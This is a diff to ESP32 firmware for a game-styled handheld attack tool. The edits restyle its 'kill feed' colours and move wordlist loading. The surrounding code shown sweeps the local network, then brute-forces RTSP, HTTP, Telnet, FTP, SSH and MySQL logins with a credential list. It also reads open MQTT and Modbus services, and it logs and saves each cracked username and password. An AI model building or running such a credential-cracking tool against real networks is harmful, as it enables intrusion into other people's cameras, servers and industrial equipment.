@@ -370,12 +370,21 @@ static void scanTask(void* param) {
     uint8_t aliveMacs[LOKI_MAX_ALIVE][6];
     int aliveCount = 0;
 
-    // Load wordlist BEFORE WiFi to avoid SPI conflicts
-    loadSdWordlist();
+    // Cache kill feed colors from theme (avoid repeated cross-core calls)
+    uint16_t KF_INFO    = LokiPet::kfInfo();
+    uint16_t KF_FOUND   = LokiPet::kfFound();
+    uint16_t KF_SUCCESS = LokiPet::kfSuccess();
+    uint16_t KF_CRACKED = LokiPet::kfCracked();
+    uint16_t KF_DIM     = LokiPet::kfDim();
+    uint16_t KF_ATTACK  = LokiPet::kfAttack();
+    uint16_t KF_ERROR   = LokiPet::kfError();
+    uint16_t KF_XP      = LokiPet::kfXp();
+
+    // Wordlist already loaded by start() on Core 1 (avoids SD bus conflict)
     {
         char msg[52];
         snprintf(msg, sizeof(msg), "[*] %d credentials armed", totalCredCount);
-        LokiPet::addKillLine(msg, LOKI_CYAN);
+        LokiPet::addKillLine(msg, KF_INFO);
     }
 
     // =========================================================================
@@ -403,7 +412,7 @@ static void scanTask(void* param) {
     if (WiFi.status() != WL_CONNECTED) {
         Serial.printf("[RECON] WiFi FAILED (status: %d)\n", WiFi.status());
         LokiPet::setStatus("WiFi failed!");
-        LokiPet::addKillLine("[!] WiFi connection failed", LOKI_RED);
+        LokiPet::addKillLine("[!] WiFi connection failed", KF_ERROR);
         LokiPet::setMood(MOOD_BORED);
         goto task_exit;
     }
@@ -419,7 +428,7 @@ static void scanTask(void* param) {
     {
         char msg[52];
         snprintf(msg, sizeof(msg), "[*] Connected: %s", localIP.toString().c_str());
-        LokiPet::addKillLine(msg, LOKI_GREEN);
+        LokiPet::addKillLine(msg, KF_SUCCESS);
         LokiPet::setStatus("Connected", localIP.toString().c_str());
     }
 
@@ -428,7 +437,7 @@ static void scanTask(void* param) {
     // =========================================================================
     scanPhase = PHASE_DISCOVER;
     LokiPet::setStatus("NetworkScanner", "Discovering hosts...");
-    LokiPet::addKillLine("[>] Host discovery started", LOKI_CYAN);
+    LokiPet::addKillLine("[>] Host discovery started", KF_INFO);
 
     // ── PHASE 1a: ARP SCAN — discover ALL alive hosts (like nmap -sn) ──
     // ARP table is 10 entries (pre-compiled SDK), so scan in batches of 8.
@@ -437,7 +446,7 @@ static void scanTask(void* param) {
         snprintf(subnetMsg, sizeof(subnetMsg), "%d.%d.%d.0/24", gatewayIP[0], gatewayIP[1], gatewayIP[2]);
         LokiPet::setStatus("NetworkScanner", subnetMsg);
     }
-    LokiPet::addKillLine("[>] ARP scan...", LOKI_CYAN);
+    LokiPet::addKillLine("[>] ARP scan...", KF_INFO);
     aliveCount = 0;
 
     #define ARP_BATCH 8
@@ -477,7 +486,7 @@ static void scanTask(void* param) {
                     snprintf(msg, sizeof(msg), "[+] %d.%d.%d.%d",
                              gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
                 }
-                LokiPet::addKillLine(msg, LOKI_BRIGHT);
+                LokiPet::addKillLine(msg, KF_FOUND);
 
                 // Update status with running count
                 char detail[32];
@@ -490,7 +499,7 @@ static void scanTask(void* param) {
     {
         char msg[52];
         snprintf(msg, sizeof(msg), "[*] %d hosts alive", aliveCount);
-        LokiPet::addKillLine(msg, LOKI_GREEN);
+        LokiPet::addKillLine(msg, KF_SUCCESS);
 
         char detail[32];
         snprintf(detail, sizeof(detail), "Found %d hosts", aliveCount);
@@ -504,7 +513,7 @@ static void scanTask(void* param) {
         char detail[40];
         snprintf(detail, sizeof(detail), "Scanning ports on %d hosts...", aliveCount);
         LokiPet::setStatus("NetworkScanner", detail);
-        LokiPet::addKillLine("[>] Port scanning...", LOKI_CYAN);
+        LokiPet::addKillLine("[>] Port scanning...", KF_INFO);
     }
 
     for (int a = 0; a < aliveCount && running; a++) {
@@ -561,7 +570,7 @@ static void scanTask(void* param) {
                 }
             }
             snprintf(msg, sizeof(msg), "[+] %s :%s", ipStr, portList.c_str());
-            LokiPet::addKillLine(msg, LOKI_BRIGHT);
+            LokiPet::addKillLine(msg, KF_FOUND);
         }
         vTaskDelay(1);
     }
@@ -577,7 +586,7 @@ static void scanTask(void* param) {
         snprintf(detail, sizeof(detail), "%d open ports found", (int)portsFound);
         LokiPet::setStatus("NetworkScanner", detail);
     }
-    LokiPet::addKillLine("[>] Service identification", LOKI_CYAN);
+    LokiPet::addKillLine("[>] Service identification", KF_INFO);
 
     for (int d = 0; d < deviceCount && running; d++) {
         char identDetail[40];
@@ -760,7 +769,7 @@ static void scanTask(void* param) {
             const char* typeStr = deviceTypeName(dev.type);
             char msg[52];
             snprintf(msg, sizeof(msg), "[*] %s %s (%s)", typeStr, ipStr, dev.banner);
-            LokiPet::addKillLine(msg, LOKI_CYAN);
+            LokiPet::addKillLine(msg, KF_INFO);
         }
         vTaskDelay(1);
     }
@@ -777,7 +786,7 @@ static void scanTask(void* param) {
         LokiPet::setStatus("NetworkScanner", detail);
     }
     LokiPet::setMood(MOOD_ATTACKING);
-    LokiPet::addKillLine("[>] Brute force started", LOKI_MAGENTA);
+    LokiPet::addKillLine("[>] Brute force started", KF_ATTACK);
 
     for (int d = 0; d < deviceCount && running; d++) {
         LokiDevice& dev = devices[d];
@@ -792,7 +801,7 @@ static void scanTask(void* param) {
             bool cracked = false;
             int connFails = 0;
 
-            LokiPet::addKillLine(("[>] RTSP brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] RTSP brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -801,7 +810,7 @@ static void scanTask(void* param) {
                 if (c > 0 && c % 10 == 0) {
                     char msg[52];
                     snprintf(msg, sizeof(msg), "[>] %s RTSP [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 if (client.connect(devIP, 554, 1000)) {
@@ -827,10 +836,10 @@ static void scanTask(void* param) {
                         LokiPet::setMood(MOOD_CRACKED);
 
                         char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
-                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                        LokiPet::addKillLine(msg, KF_CRACKED);
                     }
                 } else if (++connFails >= 5) {
-                    LokiPet::addKillLine(("[!] " + String(ipStr) + " RTSP blocked").c_str(), LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(("[!] " + String(ipStr) + " RTSP blocked").c_str(), KF_DIM);
                     break;
                 }
                 vTaskDelay(1);
@@ -867,7 +876,7 @@ static void scanTask(void* param) {
                             LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 80, user, pass);
                             LokiPet::setMood(MOOD_CRACKED);
                             char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
-                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                            LokiPet::addKillLine(msg, KF_CRACKED);
                         }
                     } else if (++connFails >= 5) break;
                     vTaskDelay(1);
@@ -877,7 +886,7 @@ static void scanTask(void* param) {
             if (!cracked && dev.status == STATUS_TESTING) {
                 if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                 char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s camera", ipStr);
-                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                LokiPet::addKillLine(msg, KF_DIM);
             }
         }
 
@@ -907,7 +916,7 @@ static void scanTask(void* param) {
                     LokiScoreManager::addServiceCracked();
                     servicesCracked++;
                     char msg[52]; snprintf(msg, sizeof(msg), "[*] OPEN %s MQTT (no auth)", ipStr);
-                    LokiPet::addKillLine(msg, LOKI_GREEN);
+                    LokiPet::addKillLine(msg, KF_SUCCESS);
                     LokiPet::setMood(MOOD_CRACKED);
 
                     // Subscribe to # and capture topics
@@ -938,7 +947,7 @@ static void scanTask(void* param) {
             bool cracked = false;
             int connFails = 0;
 
-            LokiPet::addKillLine(("[>] Telnet brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] Telnet brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -946,7 +955,7 @@ static void scanTask(void* param) {
 
                 if (c > 0 && c % 10 == 0) {
                     char msg[52]; snprintf(msg, sizeof(msg), "[>] %s Telnet [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 if (client.connect(devIP, 23, 1000)) {
@@ -993,10 +1002,10 @@ static void scanTask(void* param) {
                         LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 23, user, pass);
                         LokiPet::setMood(MOOD_CRACKED);
                         char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s telnet %s:%s", ipStr, user, pass);
-                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                        LokiPet::addKillLine(msg, KF_CRACKED);
                     }
                 } else if (++connFails >= 5) {
-                    LokiPet::addKillLine(("[!] " + String(ipStr) + " Telnet blocked").c_str(), LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(("[!] " + String(ipStr) + " Telnet blocked").c_str(), KF_DIM);
                     break;
                 }
                 vTaskDelay(1);
@@ -1005,7 +1014,7 @@ static void scanTask(void* param) {
             if (!cracked && dev.status == STATUS_TESTING) {
                 if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                 char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s telnet", ipStr);
-                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                LokiPet::addKillLine(msg, KF_DIM);
             }
         }
 
@@ -1016,7 +1025,7 @@ static void scanTask(void* param) {
             bool cracked = false;
             int connFails = 0;
 
-            LokiPet::addKillLine(("[>] FTP brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] FTP brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -1024,7 +1033,7 @@ static void scanTask(void* param) {
 
                 if (c > 0 && c % 10 == 0) {
                     char msg[52]; snprintf(msg, sizeof(msg), "[>] %s FTP [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 if (client.connect(devIP, 21, 2000)) {
@@ -1055,7 +1064,7 @@ static void scanTask(void* param) {
                         LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, "(anon)");
                         LokiPet::setMood(MOOD_CRACKED);
                         char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s (anon)", ipStr, user);
-                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                        LokiPet::addKillLine(msg, KF_CRACKED);
                     } else if (resp.startsWith("331")) {
                         // Need password
                         client.printf("PASS %s\r\n", pass);
@@ -1074,13 +1083,13 @@ static void scanTask(void* param) {
                             LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, pass);
                             LokiPet::setMood(MOOD_CRACKED);
                             char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s:%s", ipStr, user, pass);
-                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                            LokiPet::addKillLine(msg, KF_CRACKED);
                         }
                     }
                     client.print("QUIT\r\n"); delay(100);
                     client.stop();
                 } else if (++connFails >= 5) {
-                    LokiPet::addKillLine(("[!] " + String(ipStr) + " FTP blocked").c_str(), LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(("[!] " + String(ipStr) + " FTP blocked").c_str(), KF_DIM);
                     break;
                 }
                 vTaskDelay(1);
@@ -1089,7 +1098,7 @@ static void scanTask(void* param) {
             if (!cracked && dev.status == STATUS_TESTING) {
                 if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                 char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s FTP", ipStr);
-                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                LokiPet::addKillLine(msg, KF_DIM);
             }
         }
 
@@ -1099,7 +1108,7 @@ static void scanTask(void* param) {
             dev.status = STATUS_TESTING;
             bool cracked = false;
 
-            LokiPet::addKillLine(("[>] SSH brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] SSH brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -1107,7 +1116,7 @@ static void scanTask(void* param) {
 
                 if (c > 0 && c % 20 == 0) {
                     char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SSH [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 ssh_session session = ssh_new();
@@ -1129,7 +1138,7 @@ static void scanTask(void* param) {
                         LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 22, user, pass);
                         LokiPet::setMood(MOOD_CRACKED);
                         char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s SSH %s:%s", ipStr, user, pass);
-                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                        LokiPet::addKillLine(msg, KF_CRACKED);
                     }
                     ssh_disconnect(session);
                 }
@@ -1140,7 +1149,7 @@ static void scanTask(void* param) {
             if (!cracked && dev.status == STATUS_TESTING) {
                 if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                 char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s SSH", ipStr);
-                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                LokiPet::addKillLine(msg, KF_DIM);
             }
         }
 
@@ -1151,7 +1160,7 @@ static void scanTask(void* param) {
             bool cracked = false;
             int connFails = 0;
 
-            LokiPet::addKillLine(("[>] SMB brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] SMB brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -1159,7 +1168,7 @@ static void scanTask(void* param) {
 
                 if (c > 0 && c % 20 == 0) {
                     char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SMB [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 // SMB uses the same SSH library via NTLM — too complex for raw TCP
@@ -1194,7 +1203,7 @@ static void scanTask(void* param) {
                         // Check if guest/anonymous access works
                         // TODO: Implement full NTLM auth sequence
                         char msg[52]; snprintf(msg, sizeof(msg), "[*] SMB %s responds", ipStr);
-                        LokiPet::addKillLine(msg, LOKI_CYAN);
+                        LokiPet::addKillLine(msg, KF_INFO);
                     }
                 } else if (++connFails >= 5) break;
                 vTaskDelay(1);
@@ -1215,7 +1224,7 @@ static void scanTask(void* param) {
             bool cracked = false;
             int connFails = 0;
 
-            LokiPet::addKillLine(("[>] MySQL brute " + String(ipStr)).c_str(), LOKI_CYAN);
+            LokiPet::addKillLine(("[>] MySQL brute " + String(ipStr)).c_str(), KF_INFO);
 
             for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                 const char* user; const char* pass;
@@ -1223,7 +1232,7 @@ static void scanTask(void* param) {
 
                 if (c > 0 && c % 20 == 0) {
                     char msg[52]; snprintf(msg, sizeof(msg), "[>] %s MySQL [%d/%d]", ipStr, c, totalCredCount);
-                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                    LokiPet::addKillLine(msg, KF_DIM);
                 }
 
                 if (client.connect(devIP, 3306, 2000)) {
@@ -1293,7 +1302,7 @@ static void scanTask(void* param) {
                             LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 3306, user, "(empty)");
                             LokiPet::setMood(MOOD_CRACKED);
                             char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s MySQL %s", ipStr, user);
-                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
+                            LokiPet::addKillLine(msg, KF_CRACKED);
                         }
                     }
                     client.stop();
@@ -1304,7 +1313,7 @@ static void scanTask(void* param) {
             if (!cracked && dev.status == STATUS_TESTING) {
                 if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                 char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s MySQL", ipStr);
-                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
+                LokiPet::addKillLine(msg, KF_DIM);
             }
         }
 
@@ -1313,7 +1322,7 @@ static void scanTask(void* param) {
             // RDP brute force requires CredSSP/NLA which needs TLS — too complex for raw TCP
             // Log as detected service
             char msg[52]; snprintf(msg, sizeof(msg), "[*] RDP %s detected", ipStr);
-            LokiPet::addKillLine(msg, LOKI_CYAN);
+            LokiPet::addKillLine(msg, KF_INFO);
         }
 
         // ── MODBUS: Read registers (no auth) ──
@@ -1335,7 +1344,7 @@ static void scanTask(void* param) {
                     dev.status = STATUS_OPEN; servicesCracked++;
                     LokiScoreManager::addServiceCracked();
                     char msg[52]; snprintf(msg, sizeof(msg), "[*] OPEN %s Modbus (no auth)", ipStr);
-                    LokiPet::addKillLine(msg, LOKI_GREEN);
+                    LokiPet::addKillLine(msg, KF_SUCCESS);
                     LokiPet::setMood(MOOD_CRACKED);
                 } else {
                     if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
@@ -1356,7 +1365,7 @@ static void scanTask(void* param) {
     {
         char msg[52];
         snprintf(msg, sizeof(msg), "=== DONE: %d hosts, %d cracked ===", (int)hostsFound, (int)servicesCracked);
-        LokiPet::addKillLine(msg, LOKI_GOLD);
+        LokiPet::addKillLine(msg, KF_XP);
         LokiPet::setStatus("IDLE");
         LokiPet::setMood(servicesCracked > 0 ? MOOD_HAPPY : MOOD_BORED);
     }
@@ -1389,7 +1398,7 @@ static void scanTask(void* param) {
                     f.println("\n");
                 }
                 f.close();
-                LokiPet::addKillLine("[*] Report saved to SD", LOKI_GREEN);
+                LokiPet::addKillLine("[*] Report saved to SD", KF_SUCCESS);
             }
             SD.end();
         }
@@ -1416,8 +1425,11 @@ void setup() {
 void start() {
     if (scanTaskHandle) return;
     setup();
+    // Load SD wordlist on Core 1 BEFORE starting Core 0 task
+    // to avoid SD bus conflicts with pet animation sprite reads
+    loadSdWordlist();
     running = true; done = false;
-    xTaskCreatePinnedToCore(scanTask, "LokiRecon", 16384, NULL, 1, &scanTaskHandle, 0);
+    xTaskCreatePinnedToCore(scanTask, "LokiRecon", 32768, NULL, 1, &scanTaskHandle, 0);
 }
 
 void stop() {
